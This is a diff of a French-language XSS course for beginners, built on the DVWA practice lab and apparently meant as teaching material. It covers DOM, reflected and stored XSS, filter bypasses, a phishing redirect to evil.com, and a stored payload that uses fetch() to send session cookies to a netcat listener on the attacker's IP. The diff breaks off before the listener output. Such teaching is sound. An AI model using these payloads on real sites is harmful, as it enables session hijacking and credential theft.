@@ -1,180 +1,128 @@
-# Cours : XSS (Cross-Site Scripting) - Exploitation et Session Hijacking
+# Cours : XSS (Cross-Site Scripting) - Guide du Débutant pour l'Exploitation Basique et Pédagogique
 
-## Introduction
+## Partie 1 : Comprendre XSS - Les Fondamentaux
 
-Cette section couvre :
-- **Cross-Site Scripting (XSS)** : Exécution de JavaScript malveillant dans navigateur victime [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
-- **Types de XSS** : DOM-based, Reflected, Stored [reddit](https://www.reddit.com/r/cybersecurity/comments/1ey0fpz/how_exactly_does_cross_site_scripting_xss_work/)
-- **DVWA XSS DOM** : Exploitation Low/Medium [youtube](https://www.youtube.com/watch?v=JZk2qk-BB6o)
-- **DVWA XSS Reflected** : Exploitation Low/Medium [linkedin](https://www.linkedin.com/pulse/ethical-hacking-xss-dvwa-mohammed-fahim-khan-p746f)
-- **DVWA XSS Stored** : Exploitation et persistence [en.wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
-- **Session Hijacking** : Vol de cookies et usurpation d'identité [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)
+### 1.1 Qu'est-ce que XSS ? (Explication simple)
 
-***
+Imaginez que vous visitiez un site web. Normalement, ce site affiche du contenu que le propriétaire a créé. Mais s'il y a une vulnérabilité XSS, un attaquant peut **injecter du code JavaScript** qui s'exécutera dans votre navigateur lorsque vous visiterez la page.
 
-## Partie 1 : XSS - Concepts fondamentaux
+🔑 **Point clé** : XSS signifie "**Cross-Site Scripting**" = Script d'un site qui s'exécute sur un autre site.
 
-### 1.1 Définition
+---
 
-**Cross-Site Scripting (XSS)** : Vulnérabilité permettant à un attaquant d'**injecter du code JavaScript malveillant** dans une page web, qui sera exécuté dans le navigateur des victimes visitant cette page. [developer.mozilla](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
+### 1.2 Pourquoi XSS est dangereux ?
 
-**OWASP Top 10 2021** : **A03:2021 – Injection** (XSS fait partie de cette catégorie).
+Lorsqu'un code JavaScript malveillant s'exécute dans votre navigateur, il peut :
 
-**Impact**  : [invicti](https://www.invicti.com/learn/cookie-hijacking)
-- 🔴 **Vol de cookies/sessions** : Session hijacking
-- 🔴 **Vol de credentials** : Keylogging, phishing
-- 🔴 **Defacement** : Modification de la page
-- 🔴 **Redirection malveillante** : Vers site de phishing
-- 🔴 **Propagation de malware** : Drive-by download
+| ⚠️ Danger | Explication simple |
+|-----------|-------------------|
+| **Vol de cookies** | Le JavaScript peut lire vos cookies de connexion |
+| **Keylogging** | Enregistrer tout ce que vous tapez au clavier |
+| **Phishing** | Rediriger vers une fausse page de connexion |
+| **Defacement** | Modifier l'apparence de la page |
+| **Propagation** | Télécharger des malwares automatiquement |
 
-### 1.2 Types de XSS
+---
 
-**Les 3 types principaux**  : [trendmicro](https://www.trendmicro.com/en_us/research/23/e/cross-site-scripting-xss-attacks.html)
+### 1.3 Les 3 types de XSS - Tableau comparatif
 
-| Type | Stockage | Exécution | Persistance | Gravité |
-|------|----------|-----------|-------------|---------|
-| **DOM-based** | Client (DOM) | Client uniquement | Non persistante | Moyenne |
-| **Reflected** | Serveur (temporaire) | Serveur + Client | Non persistante | Moyenne |
-| **Stored** | Serveur (DB) | Tous les visiteurs | Persistante | **Critique** |
+| Type | Comment ça marche | Persistance | Dangerosité |
+|------|------------------|-------------|-------------|
+| **DOM-based** | Le code manipule directement la page dans le navigateur | ❌ Non persistant | 🟡 Moyen |
+| **Reflected** | L'attaque est dans l'URL et renvoyée par le serveur | ❌ Non persistant | 🟡 Moyen |
+| **Stored** | L'attaque est stockée dans la base de données | ✅ Persistant | 🔴 **Très dangereux** |
 
-#### a) DOM-based XSS [linkedin](https://www.linkedin.com/pulse/xss-depth-from-reflected-dom-based-how-defend-against-elgabroun-dbh1f)
+---
 
-**Définition** : L'attaque manipule le **Document Object Model (DOM)** directement dans le navigateur, **sans que le serveur ne soit impliqué**. [linkedin](https://www.linkedin.com/pulse/xss-depth-from-reflected-dom-based-how-defend-against-elgabroun-dbh1f)
+### 1.4 Analogie pour comprendre les types
 
-**Caractéristique clé** : Le payload **ne passe jamais par le serveur** → Filtrage serveur inefficace. [en.wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
+🎯 **Analogie d'un tableau d'affichage** :
 
-**Exemple vulnérable**  : [linkedin](https://www.linkedin.com/pulse/xss-depth-from-reflected-dom-based-how-defend-against-elgabroun-dbh1f)
+- **DOM-based** : Vous écrivez un message sur un post-it et le collez vous-même sur le tableau.
+- **Reflected** : Vous donnez un message à quelqu'un qui le lit à haute voix une fois.
+- **Stored** : Vous écrivez un message qui est imprimé et affiché **permanemment** sur le tableau pour tout le monde.
 
+---
+
+## Partie 2 : Mise en place de l'environnement
+
+### 2.1 Prérequis
+
+Pour suivre ce cours, vous aurez besoin de :
+
+```
+✅ DVWA (Damn Vulnerable Web Application) installé
+✅ Un navigateur web (Chrome/Firefox)
+✅ Accès aux outils de développement (F12)
+```
+
+### 2.2 Configuration initiale
+
+1. Ouvrir DVWA dans votre navigateur
+2. Se connecter (par défaut : admin/password)
+3. Aller dans "DVWA Security"
+4. Sélectionner le niveau : **Low** (pour commencer)
+
+---
+
+## Partie 3 : XSS DOM (Document Object Model)
+
+### 3.1 Comprendre le DOM
+
+Le **DOM** est une représentation de la page web sous forme d'arbre. JavaScript peut modifier cet arbre pour changer le contenu affiché.
+
+🔍 **Exemple simple** :
 ```html
-<!-- URL: https://example.com/#<script>alert('XSS')</script> -->
+<div id="message">Bonjour</div>
 <script>
-    // Code JavaScript client-side
-    var lang = window.location.hash.substring(1); // Récupère fragment (#)
-    document.getElementById('output').innerHTML = lang; // Injection !
+  document.getElementById('message').innerHTML = 'Au revoir';
 </script>
-
-<div id="output"></div>
 ```
+→ Le texte "Bonjour" devient "Au revoir"
 
-**Exploitation** :
-```
-URL: https://example.com/#<script>alert('XSS')</script>
-→ JavaScript exécuté dans le navigateur
-```
+---
 
-#### b) Reflected XSS [owasp](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
+### 3.2 Exercice 1 : Découverte de la vulnérabilité DVWA XSS (DOM)
 
-**Définition** : L'input utilisateur est **immédiatement renvoyé** par le serveur dans la page HTML, **sans être stocké**. [trendmicro](https://www.trendmicro.com/en_us/research/23/e/cross-site-scripting-xss-attacks.html)
-
-**Flux d'attaque**  : [trendmicro](https://www.trendmicro.com/en_us/research/23/e/cross-site-scripting-xss-attacks.html)
-```
-1. Attaquant crée URL malveillante
-2. Victime clique sur l'URL (phishing)
-3. Serveur inclut payload dans réponse HTML
-4. Navigateur exécute JavaScript
-```
-
-**Exemple vulnérable**  : [reddit](https://www.reddit.com/r/cybersecurity/comments/1ey0fpz/how_exactly_does_cross_site_scripting_xss_work/)
-
-```php
-<?php
-// Page de recherche
-$search = $_GET['q'];
-echo "Résultats pour : " . $search;
-?>
-```
-
-**Exploitation** :
-```
-URL: https://example.com/search.php?q=<script>alert('XSS')</script>
-
-Réponse HTML:
-Résultats pour : <script>alert('XSS')</script>
-→ Script exécuté
-```
-
-#### c) Stored XSS (Persistent) [owasp](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
-
-**Définition** : Le payload est **stocké sur le serveur** (DB, fichier) et exécuté **chaque fois qu'un utilisateur visite la page**. [en.wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
-
-**Gravité** : **La plus dangereuse** → Affecte tous les utilisateurs. [owasp](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
-
-**Exemple vulnérable**  : [reddit](https://www.reddit.com/r/cybersecurity/comments/1ey0fpz/how_exactly_does_cross_site_scripting_xss_work/)
-
-```php
-<?php
-// Formulaire de commentaire
-if ($_POST['comment']) {
-    $comment = $_POST['comment'];
-    // Stockage SANS validation
-    mysqli_query($conn, "INSERT INTO comments (text) VALUES ('$comment')");
-}
-
-// Affichage des commentaires
-$comments = mysqli_query($conn, "SELECT text FROM comments");
-while ($row = mysqli_fetch_assoc($comments)) {
-    echo "<div>" . $row['text'] . "</div>"; // XSS !
-}
-?>
-```
-
-**Exploitation** :
-```
-Commentaire: <script>alert('XSS')</script>
-→ Stocké dans DB
-→ Exécuté pour TOUS les visiteurs
-```
-
-***
-
-## Partie 2 : DVWA XSS (DOM) - Exploitation
-
-### 2.1 Configuration
+**Étape 1 : Accéder à la page**
 
 ```
-1. DVWA → XSS (DOM)
-2. Security: Low
+DVWA → XSS (DOM)
 ```
 
-**Interface** :
+Vous verrez un menu déroulant pour choisir une langue.
 
-```
-┌─────────────────────────────────────┐
-│  Please choose a language:          │
-│  [English ▼] [Select]               │
-└─────────────────────────────────────┘
-```
+---
 
-### 2.2 Analyse du comportement (Low)
+**Étape 2 : Observer l'URL**
 
-**Test légitime** :
+Sélectionnez "French" et cliquez sur "Select". Regardez l'URL :
 
-```
-1. Sélectionner "French"
-2. Cliquer "Select"
-```
-
-**URL modifiée**  : [youtube](https://www.youtube.com/watch?v=JZk2qk-BB6o)
 ```
 http://servertcm:8001/vulnerabilities/xss_dom/?default=French
 ```
 
-**Observation** : Paramètre `default` dans l'URL contrôle la langue affichée.
+🔑 **Observation** : Le paramètre `default=French` contrôle la langue affichée.
 
-**Code HTML généré** :
+---
 
-```html
-<select name="default">
-    <option value="English">English</option>
-    <option value="French" selected>French</option>
-    <option value="German">German</option>
-    <option value="Spanish">Spanish</option>
-</select>
+**Étape 3 : Tester une modification manuelle**
+
+Changez l'URL manuellement :
+
+```
+http://servertcm:8001/vulnerabilities/xss_dom/?default=Espagnol
 ```
 
-### 2.3 Analyse du code source (Low)
+→ Le menu affichera "Espagnol"
 
-**Code JavaScript vulnérable**  : [youtube](https://www.youtube.com/watch?v=JZk2qk-BB6o)
+💡 **Conclusion** : Ce que nous mettons dans l'URL s'affiche directement sur la page !
+
+---
+
+### 3.3 Explication du code vulnérable
+
+Voici le code JavaScript qui rend la page vulnérable :
 
 ```javascript
 if (document.location.href.indexOf("default=") >= 0) {
@@ -182,456 +130,597 @@ if (document.location.href.indexOf("default=") >= 0) {
         document.location.href.indexOf("default=") + 8
     );
     
-    // Injection dans innerHTML !
+    // ⚠️ PROBLÈME : Injection directe sans vérification !
     document.write("<option value='" + lang + "'>" + lang + "</option>");
 }
 ```
 
-**Vulnérabilité** : `lang` est directement injecté dans `document.write()` sans validation. [linkedin](https://www.linkedin.com/pulse/xss-depth-from-reflected-dom-based-how-defend-against-elgabroun-dbh1f)
+❌ **Le problème** : La valeur de `lang` est directement insérée dans le HTML sans aucune vérification.
 
-### 2.4 Exploitation : Injection de script (Low)
+---
 
-**Stratégie**  : [linkedin](https://www.linkedin.com/pulse/ethical-hacking-xss-dvwa-mohammed-fahim-khan-p746f)
-1. Fermer les balises `<option>` et `<select>`
-2. Injecter balise `<script>`
-3. Exécuter JavaScript arbitraire
+### 3.4 Exercice 2 : Première exploitation XSS (Alert)
 
-**Payload** :
+**Objectif** : Faire apparaître une boîte de dialogue "XSS" sur la page.
+
+---
+
+**Étape 1 : Construire le payload**
+
+Nous allons injecter du code HTML qui inclut du JavaScript :
 
 ```
-default='></option></select><script>alert('XSS')</script>
+<script>alert('XSS')</script>
 ```
 
-**URL complète** :
+🔑 **Explication** :
+- `<script>` : Balise pour exécuter du JavaScript
+- `alert('XSS')` : Fonction qui affiche une boîte de dialogue
+- `</script>` : Fermeture de la balise script
+
+---
+
+**Étape 2 : Contourner le menu déroulant**
+
+Le payload précédent ne fonctionnera pas directement car il est inséré dans une balise `<option>`. Nous devons d'abord fermer cette balise :
+
+```
+'></option></select><script>alert('XSS')</script>
+```
+
+🔍 **Décomposition pas à pas** :
+
+| Caractère | Rôle | Explication |
+|-----------|------|-------------|
+| `'` | Ferme l'attribut | Ferme `value='` |
+| `>` | Ferme la balise | Ferme `<option>` |
+| `</option>` | Fermeture propre | Ferme complètement `<option>` |
+| `</select>` | Fermeture propre | Ferme complètement `<select>` |
+| `<script>alert('XSS')</script>` | Code malveillant | Notre payload XSS |
+
+---
+
+**Étape 3 : Injecter le payload**
+
+Construisez l'URL complète :
 
 ```
 http://servertcm:8001/vulnerabilities/xss_dom/?default='></option></select><script>alert('XSS')</script>
 ```
 
-**HTML généré** :
+Accédez à cette URL dans votre navigateur.
 
-```html
-<select name="default">
-    <option value="English">English</option>
-    <option value="'></option></select><script>alert('XSS')</script>">
-        '></option></select><script>alert('XSS')</script>
-    </option>
-</select>
-```
+---
 
-**Résultat** : Pop-up `alert('XSS')` affiché ! ✅
+**Étape 4 : Vérifier le résultat**
 
-**Explication détaillée** :
+✅ **Succès !** Une boîte de dialogue avec "XSS" apparaît !
 
-```html
-Payload: '></option></select><script>alert('XSS')</script>
+💡 **Ce qui s'est passé** :
+1. Le navigateur a chargé la page
+2. Le JavaScript vulnérable a lu le paramètre `default`
+3. Il a injecté notre payload dans le HTML
+4. Le navigateur a exécuté notre `<script>alert('XSS')</script>`
 
-1. '           → Ferme l'attribut value='
-2. >           → Ferme la balise <option>
-3. </option>   → Ferme proprement <option>
-4. </select>   → Ferme proprement <select>
-5. <script>alert('XSS')</script> → Code malveillant exécuté
-```
+---
 
-### 2.5 Exploitation : Redirection malveillante
+### 3.5 Exercice 3 : Redirection malveillante
 
-**Payload**  : [linkedin](https://www.linkedin.com/pulse/ethical-hacking-xss-dvwa-mohammed-fahim-khan-p746f)
+**Objectif** : Rediriger l'utilisateur vers un autre site.
+
+---
+
+**Payload de redirection** :
 
 ```javascript
-'></option></select><script>document.location.href="https://evil.com/phishing"</script>
+'></option></select><script>document.location.href="https://google.com"</script>
 ```
 
-**URL** :
+🔑 **Explication** :
+- `document.location.href` = L'URL actuelle
+- En la modifiant, on redirige l'utilisateur
+- Ici, on redirige vers Google
+
+---
+
+**Testez-le** :
 
 ```
-http://servertcm:8001/vulnerabilities/xss_dom/?default='></option></select><script>document.location.href="https://evil.com/phishing"</script>
+http://servertcm:8001/vulnerabilities/xss_dom/?default='></option></select><script>document.location.href="https://google.com"</script>
 ```
 
-**Résultat** : Victime redirigée vers site malveillant.
+→ La page redirige automatiquement vers Google !
 
-**Cas d'usage** :
-- Phishing : Fausse page de login
-- Drive-by download : Téléchargement de malware
-- Affiliation : Clics frauduleux
+⚠️ **Note** : Dans une attaque réelle, l'attaquant redirigerait vers une fausse page de login pour voler les identifiants.
 
-### 2.6 Exploitation : Medium Security
+---
 
-**Configuration** :
+### 3.6 Exercice 4 : Niveau Medium - Bypass de filtre
+
+**Changement de niveau** :
 
 ```
 DVWA Security → Medium
 ```
 
-**Test payload précédent** :
+---
+
+**Test du payload précédent** :
 
 ```
 '></option></select><script>alert('XSS')</script>
-→ Ne fonctionne plus ❌
 ```
 
-**Code source (Medium)**  : [youtube](https://www.youtube.com/watch?v=JZk2qk-BB6o)
+❌ **Ça ne fonctionne plus !** Le filtre a supprimé `<script`.
+
+---
+
+**Analyse du filtre** :
 
 ```php
 <?php
-// Filtrage côté serveur
 $default = $_GET['default'];
-$default = str_replace("<script", "", $default);
+$default = str_replace("<script", "", $default); // Supprime "<script"
 echo $default;
 ?>
 ```
 
-**Protection** : Filtre `<script` → Supprimé.
+🔍 **Le filtre** : Il cherche exactement `<script` et le supprime.
 
-**Bypass : Balise `<img>` avec `onerror`**  : [linkedin](https://www.linkedin.com/posts/suresh-aydi_you-can-use-image-onerroralert-src-activity-7383774604265291776-baWe)
+---
 
-**Payload** :
+**Bypass : Utiliser une autre balise**
 
-```html
+Au lieu de `<script>`, nous pouvons utiliser `<img>` avec un gestionnaire d'erreur :
+
+```
 "></option></select><img src=x onerror="alert('XSS')">
 ```
 
-**URL** :
+🔑 **Explication** :
+- `<img src=x>` : Image avec une source invalide ("x" n'existe pas)
+- `onerror="alert('XSS')"` : Code exécuté quand l'image échoue à charger
+- Résultat : L'erreur déclenche notre `alert('XSS')`
+
+---
+
+**Testez-le** :
 
 ```
 http://servertcm:8001/vulnerabilities/xss_dom/?default="></option></select><img src=x onerror="alert('XSS')">
 ```
 
-**Explication** :
-- `<img src=x>` : Balise image avec source invalide
-- `onerror="alert('XSS')"` : Event handler exécuté quand image échoue
-- Bypass réussi car filtre cible seulement `<script>` [linkedin](https://www.linkedin.com/posts/suresh-aydi_you-can-use-image-onerroralert-src-activity-7383774604265291776-baWe)
+✅ **Succès !** L'alerte apparaît même avec le filtre !
 
-**Résultat** : Pop-up affiché ! ✅
+💡 **Leçon** : Les filtres simples sont souvent contournables en utilisant des techniques alternatives.
 
-**Alternatives**  : [gayunkim-1.tistory](https://gayunkim-1.tistory.com/28)
+---
 
-```html
-<!-- SVG onload -->
-"></option></select><svg onload="alert('XSS')">
+## Partie 4 : XSS Reflected
 
-<!-- Body onload -->
-"></option></select><body onload="alert('XSS')">
+### 4.1 Comprendre XSS Reflected
 
-<!-- iframe srcdoc -->
-"></option></select><iframe srcdoc="<script>alert('XSS')</script>">
-```
-
-***
-
-## Partie 3 : DVWA XSS (Reflected) - Exploitation
-
-### 3.1 Configuration
+🔄 **Flux de l'attaque** :
 
 ```
-1. DVWA → XSS (Reflected)
-2. Security: Low
+1. Attaquant crée une URL malveillante
+2. Attaquant envoie l'URL à la victime (par email, phishing...)
+3. Victime clique sur l'URL
+4. Serveur renvoie le payload dans la page
+5. Navigateur de la victime exécute le JavaScript
 ```
 
-**Interface** :
+🔑 **Caractéristique** : L'attaque doit être déclenchée par la victime (elle ne persistera pas).
+
+---
+
+### 4.2 Exercice 5 : Exploitation XSS Reflected (Low)
+
+**Accès à la page** :
 
 ```
-┌─────────────────────────────────────┐
-│  What's your name?                  │
-│  [________] [Submit]                │
-└─────────────────────────────────────┘
+DVWA → XSS (Reflected)
 ```
 
-### 3.2 Exploitation : Low Security
+Vous verrez un formulaire : "What's your name?"
 
-**Test légitime** :
+---
+
+**Test normal** :
 
 ```
 Input: John
-Résultat: Hello John
+Output: Hello John
 ```
 
-**URL** :
+L'URL devient :
 
 ```
 http://servertcm:8001/vulnerabilities/xss_r/?name=John
 ```
 
+🔑 **Observation** : Le nom est dans le paramètre `name` de l'URL.
+
+---
+
 **Payload XSS** :
 
-```html
+```
 <script>alert('XSS')</script>
 ```
 
-**URL** :
+Construisez l'URL :
 
 ```
 http://servertcm:8001/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
 ```
 
-**Résultat** : Pop-up affiché directement ! ✅
+Accédez à cette URL.
 
-### 3.3 Exploitation : Medium Security
+---
 
-**Test payload précédent** :
+**Résultat** :
+
+✅ **Succès !** L'alerte apparaît immédiatement !
+
+💡 **Ce qui s'est passé** :
+1. Le serveur a reçu `name=<script>alert('XSS')</script>`
+2. Il l'a inséré dans la page HTML
+3. Le navigateur a exécuté le script
+
+---
+
+### 4.3 Scénario d'attaque réaliste
+
+Imaginez ce scénario :
+
+```
+📧 Email de phishing :
+
+"Cher utilisateur, veuillez vérifier votre compte :
+https://banque.com/verifier?name=<script>document.location.href='http://evil.com/fausse-login'</script>
+
+Cordialement,
+L'équipe de sécurité"
+```
+
+Si la victime clique, elle sera redirigée vers une fausse page de login !
+
+---
+
+### 4.4 Exercice 6 : Niveau Medium - Bypass
+
+**Changement de niveau** :
+
+```
+DVWA Security → Medium
+```
+
+---
+
+**Test du payload `<script>`** :
 
 ```
 <script>alert('XSS')</script>
-→ Filtré ❌
 ```
 
-**Bypass avec `<img onerror>`**  : [linkedin](https://www.linkedin.com/posts/suresh-aydi_you-can-use-image-onerroralert-src-activity-7383774604265291776-baWe)
+❌ **Filtré !** Le `<script` est supprimé.
 
-**Payload** :
+---
 
-```html
+**Bypass avec `<img onerror>`** :
+
+```
 <img onerror="alert('XSS')" src=x>
 ```
 
-**URL** :
+Construisez l'URL :
 
 ```
 http://servertcm:8001/vulnerabilities/xss_r/?name=<img onerror="alert('XSS')" src=x>
 ```
 
-**Résultat** : Pop-up affiché ! ✅
+✅ **Succès !** Le bypass fonctionne aussi ici !
 
-***
+---
 
-## Partie 4 : DVWA XSS (Stored) - Exploitation
+## Partie 5 : XSS Stored (Persistent)
 
-### 4.1 Configuration
+### 5.1 Comprendre XSS Stored
 
-```
-1. DVWA → XSS (Stored)
-2. Security: Low
-```
+🔴 **C'est le type le plus dangereux !**
 
-**Interface** :
+🔄 **Flux de l'attaque** :
 
 ```
-┌─────────────────────────────────────┐
-│  Name:    [________________]        │
-│  Message: [__________________]      │
-│           [__________________]      │
-│           [Sign Guestbook]          │
-└─────────────────────────────────────┘
+1. Attaquant injecte le payload dans un champ (commentaire, message...)
+2. Payload est stocké dans la base de données
+3. Chaque visiteur de la page exécute le payload
+4. Attaquant n'a plus besoin d'intervenir
 ```
 
-### 4.2 Limitation de champ (à bypasser)
+🔑 **Caractéristique** : Une fois injecté, le payload affecte **tous les visiteurs**.
 
-**Observation** :
+---
+
+### 5.2 Exercice 7 : Découverte de la vulnérabilité
+
+**Accès à la page** :
+
+```
+DVWA → XSS (Stored)
+```
+
+Vous verrez un formulaire avec :
+- Un champ "Name"
+- Un champ "Message"
+- Un bouton "Sign Guestbook"
+
+---
+
+**Test normal** :
+
+```
+Name: Alice
+Message: Bonjour tout le monde !
+```
+
+→ Le message apparaît dans la liste des messages.
+
+---
+
+### 5.3 Exercice 8 : Contourner la limitation de champ
+
+**Observation du code HTML** (F12 → Inspecteur) :
 
 ```html
 <input type="text" name="txtName" maxlength="10">
 ```
 
-**Limitation** : Champ `Name` limité à **10 caractères** côté client.
+⚠️ **Problème** : Le champ "Name" est limité à 10 caractères ! Notre payload `<script>alert('XSS')</script>` fait 25 caractères.
 
-**Bypass**  : [linkedin](https://www.linkedin.com/pulse/ethical-hacking-xss-dvwa-mohammed-fahim-khan-p746f)
+---
 
-```
-1. Navigateur → F12 (DevTools)
-2. Inspecteur → Sélectionner <input name="txtName">
-3. Modifier attribut : maxlength="10" → maxlength="100"
-4. OU supprimer attribut maxlength
-```
+**Solution : Modifier le HTML**
 
-**Alternative (ZAP)** :
+1. Faites un clic droit sur le champ "Name"
+2. Sélectionnez "Inspecter"
+3. Dans le code HTML, trouvez `maxlength="10"`
+4. Changez-le en `maxlength="100"` (ou supprimez l'attribut)
+5. Appuyez sur Entrée
 
-```
-1. ZAP History → POST /vulnerabilities/xss_s/
-2. Open/Resend with Request Editor
-3. Modifier body : txtName=<script>alert('XSS')</script>
-4. Send
-```
+✅ **Maintenant vous pouvez écrire plus de 10 caractères !**
 
-### 4.3 Exploitation : Low Security
+💡 **Leçon important** : Les limitations côté client (HTML/JavaScript) ne sont pas des sécurités ! Elles peuvent être contournées.
+
+---
+
+### 5.4 Exercice 9 : Injection XSS Stored
 
 **Payload** :
 
 ```
 Name: <script>alert('XSS')</script>
-Message: Test message
+Message: Ceci est un test
 ```
+
+Cliquez sur "Sign Guestbook".
+
+---
 
 **Résultat** :
 
-```
-1. Soumettre le formulaire
-2. Page se recharge
-3. Pop-up alert('XSS') affiché
-4. Pop-up affiché pour TOUS les visiteurs de la page
-```
+✅ **Succès !** L'alerte apparaît !
 
-**Succès** : XSS Stored persistant ! 🔴
+🔍 **Observation importante** : Actualisez la page (F5) → L'alerte réapparaît !
 
-**Observation** : Même après rafraîchissement, le payload reste actif (stocké en DB).
+💡 **Pourquoi ?** Le payload est stocké dans la base de données et s'exécute à chaque chargement de la page.
 
-### 4.4 Test de persistance
+---
 
-**Ouvrir navigateur en mode privé** :
+### 5.5 Exercice 10 : Tester la persistance
+
+**Ouvrez un navigateur en mode privé** :
 
 ```
-1. Nouvelle fenêtre privée
-2. Accéder à DVWA XSS (Stored)
-3. Sans aucune action → Pop-up s'affiche automatiquement
+Chrome : Ctrl + Shift + N
+Firefox : Ctrl + Shift + P
 ```
 
-**✅ Confirmation** : XSS Stored affecte **tous les utilisateurs**.
+Accédez à DVWA XSS (Stored) sans vous connecter.
 
-***
+---
 
-## Partie 5 : Session Hijacking via XSS - Cookie Stealing
+**Résultat** :
 
-### 5.1 Concept
+✅ **L'alerte apparaît automatiquement !**
 
-**Session Hijacking** : Technique permettant de **voler le cookie de session** d'un utilisateur pour **usurper son identité** sans connaître son mot de passe. [qiita](https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515)
+🔴 **Conclusion** : Le XSS Stored affecte **tous les visiteurs**, même ceux qui ne sont pas connectés !
 
-**Workflow d'attaque**  : [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)
+---
+
+## Partie 6 : Session Hijacking (Vol de Session)
+
+### 6.1 Comprendre les sessions
+
+🔑 **Comment fonctionne une connexion web ?**
+
+1. Vous vous connectez avec votre mot de passe
+2. Le serveur crée une **session** pour vous
+3. Le serveur vous donne un **cookie de session** (ex: `PHPSESSID=abc123`)
+4. Votre navigateur envoie ce cookie à chaque requête
+5. Le serveur reconnaît le cookie et sait que c'est vous
+
+🍪 **Analogie** : Le cookie de session est comme un "badge d'accès" temporaire.
+
+---
+
+### 6.2 Le danger du vol de cookie
+
+Si un attaquant vole votre cookie de session :
 
 ```
-1. Attaquant injecte XSS (Stored de préférence)
-2. Victime visite la page
-3. JavaScript malveillant s'exécute
-4. document.cookie envoyé vers serveur attaquant
-5. Attaquant récupère cookie PHPSESSID
-6. Attaquant impersonne la victime
+😈 Attaquant : "J'ai le cookie PHPSESSID=abc123"
+🌐 Serveur : "C'est le badge de l'admin... Bienvenue admin !"
+😈 Attaquant : "Je suis connecté en tant qu'admin sans connaître le mot de passe !"
 ```
 
-### 5.2 Analyse du cookie de session
+🔴 **C'est le Session Hijacking** = Usurpation de session.
 
-**Inspecter les cookies** :
+---
+
+### 6.3 Exercice 11 : Observer le cookie de session
+
+**Étape 1 : Se connecter à DVWA**
+
+Connectez-vous avec admin/password.
+
+---
+
+**Étape 2 : Ouvrir les outils de développement**
 
 ```
-1. DVWA connecté
-2. F12 → Application (Chrome) ou Stockage (Firefox)
-3. Cookies → http://servertcm:8001
+F12 → Application (Chrome) ou Stockage (Firefox) → Cookies
 ```
 
-**Cookies présents** :
+---
 
-| Nom | Valeur | HttpOnly | Secure | SameSite |
-|-----|--------|----------|--------|----------|
-| `PHPSESSID` | `abc123def456...` | ❌ Non | ❌ Non | None |
-| `security` | `low` | ❌ Non | ❌ Non | None |
+**Étape 3 : Observer les cookies**
 
-**⚠️ Vulnérabilité** : **HttpOnly = Non** → Cookie accessible via JavaScript. [invicti](https://www.invicti.com/learn/cookie-hijacking)
+Vous verrez quelque chose comme :
 
-### 5.3 Test d'accès au cookie via JavaScript
+| Nom | Valeur | HttpOnly | Secure |
+|-----|--------|----------|--------|
+| `PHPSESSID` | `abc123def456...` | ❌ Non | ❌ Non |
+| `security` | `low` | ❌ Non | ❌ Non |
 
-**Console navigateur** (F12 → Console) :
+⚠️ **Point critique** : `HttpOnly = Non` signifie que le cookie est accessible via JavaScript !
+
+---
+
+**Étape 4 : Tester l'accès au cookie**
+
+Ouvrez la console (F12 → Console) et tapez :
 
 ```javascript
-console.log(document.cookie);
+document.cookie
 ```
 
-**Résultat** :
+Résultat :
 
 ```
 PHPSESSID=abc123def456...; security=low
 ```
 
-**✅ Confirmation** : Cookie accessible via `document.cookie`. [middlebrick](https://middlebrick.com/security/auth/session-cookies/xss-cross-site-scripting)
+✅ **Confirmation** : JavaScript peut lire le cookie !
 
-### 5.4 Préparation : Listener Netcat
+---
 
-**Sur machine attaquante (Kali)** :
+### 6.4 Exercice 12 : Voler le cookie via XSS
+
+**Préparation : Listener Netcat**
+
+Ouvrez un terminal (sur votre machine Kali/Linux) et lancez :
 
 ```bash
-# Lancer listener sur port 8000
 nc -nvlp 8000
-
-# -n : No DNS
-# -v : Verbose
-# -l : Listen
-# -p : Port 8000
 ```
 
-**Résultat** :
+🔑 **Explication** :
+- `nc` = Netcat, outil de réseau
+- `-n` = Pas de résolution DNS
+- `-v` = Verbose (affiche les détails)
+- `-l` = Mode écoute (listen)
+- `-p 8000` = Port 8000
+
+→ Le terminal attend une connexion sur le port 8000.
+
+---
+
+**Injection du payload de vol**
+
+Allez sur DVWA XSS (Stored) et injectez :
 
 ```
-listening on [any] 8000 ...
+Name: Hacker
+Message: <script>fetch('http://192.168.1.48:8000/'+document.cookie);</script>
 ```
 
-### 5.5 Injection du payload de vol de cookie
+⚠️ **Important** : Remplacez `192.168.1.48` par votre propre adresse IP !
 
-**Stratégie** :
-1. Injecter JavaScript dans XSS (Stored)
-2. JavaScript envoie `document.cookie` vers serveur attaquant
-3. Utiliser `fetch()` pour requête HTTP
+🔑 **Explication du payload** :
 
-**Payload**  : [qiita](https://qiita.com/nozomi2025/items/9cb849ee10e0fb88c515)
+| Partie | Rôle |
+|--------|------|
+| `<script>...</script>` | Balise JavaScript |
+| `fetch(...)` | Fonction pour faire une requête HTTP |
+| `'http://192.168.1.48:8000/'` | URL de votre machine (attaquant) |
+| `+document.cookie` | Le cookie de session est ajouté à l'URL |
 
-```html
-<script>fetch('http://192.168.1.48:8000/'+document.cookie);</script>
-```
+---
 
-**Explication** :
-- `fetch()` : API moderne pour requêtes HTTP
-- `http://192.168.1.48:8000/` : IP de la machine attaquante (Kali)
-- `document.cookie` : Cookie de session de la victime
-- Requête GET vers `http://192.168.1.48:8000/PHPSESSID=abc123...`
+**Ce qui se passe** :
 
-**Injection** :
+1. Le navigateur de la victime exécute le JavaScript
+2. `document.cookie` lit le cookie (ex: `PHPSESSID=abc123`)
+3. `fetch()` envoie une requête vers votre machine
+4. Votre reçoit : `GET /PHPSESSID=abc123; security=low`
 
-```
-1. DVWA → XSS (Stored)
-2. Name: [modifier maxlength]
-3. Name: Hacker
-4. Message: <script>fetch('http://192.168.1.48:8000/'+document.cookie);</script>
-5. Sign Guestbook
-```
+---
 
-### 5.6 Extraction du cookie
-
-**Résultat sur Netcat** :
+**Résultat dans Netcat** :
 
